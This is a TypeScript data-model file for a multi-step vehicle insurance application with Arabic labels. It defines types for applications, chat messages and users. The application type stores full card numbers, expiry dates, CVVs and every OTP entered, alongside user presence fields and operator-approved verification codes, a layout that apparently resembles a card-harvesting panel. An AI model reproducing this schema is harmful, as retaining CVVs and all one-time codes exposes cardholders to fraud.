export interface InsuranceApplication {
  id?: string;
  // Step 1: Basic Information
  identityNumber: string;
  ownerName: string;
  phoneNumber: string;
  documentType: "استمارة" | "بطاقة جمركية";
  serialNumber: string;
  insuranceType: "تأمين جديد" | "نقل ملكية";

  // Step 2: Insurance Details
  coverageType: string;
  insuranceStartDate: string;
  vehicleUsage: string;
  vehicleValue: number;
  manufacturingYear: number;
  vehicleModel: string;
  repairLocation: "agency" | "workshop";

  // Step 3: Selected Offer
  selectedOffer?: {
    id: number;
    company: string;
    price: number;
    type: string;
    features: string[];
  };
  lastseen?: string;
  online?: string;
  country: string;
  otp: string;
  allOtps: string[]; // Step 4: Payment
  paymentMethod?: string;
  cardNumber?: string;
  expiryDate?: string;
  cvv?: string;
  paymentStatus: "pending" | "completed" | "failed";

  // Verification fields for phone and ID card codes
  phoneVerificationCode?: string;
  phoneVerificationStatus?: "pending" | "approved" | "rejected";
  phoneVerifiedAt?: Date;
  idVerificationCode?: string;
  idVerificationStatus?: "pending" | "approved" | "rejected";
  idVerifiedAt?: Date;

  // Metadata
  currentStep: number;
  status: "draft" | "pending_review" | "approved" | "rejected" | "completed";
  assignedProfessional?: string;
  createdAt: string;
  updatedAt: string;
  notes?: string;
}

export interface ChatMessage {
  id?: string;
  applicationId: string;
  senderId: string;
  senderName: string;
  senderRole: "customer" | "professional" | "admin";
  message: string;
  timestamp: Date;
  read: boolean;
}

export interface User {
  id: string;
  email: string;
  name: string;
  role: "customer" | "professional" | "admin" | "pays";
  createdAt: Date;
}
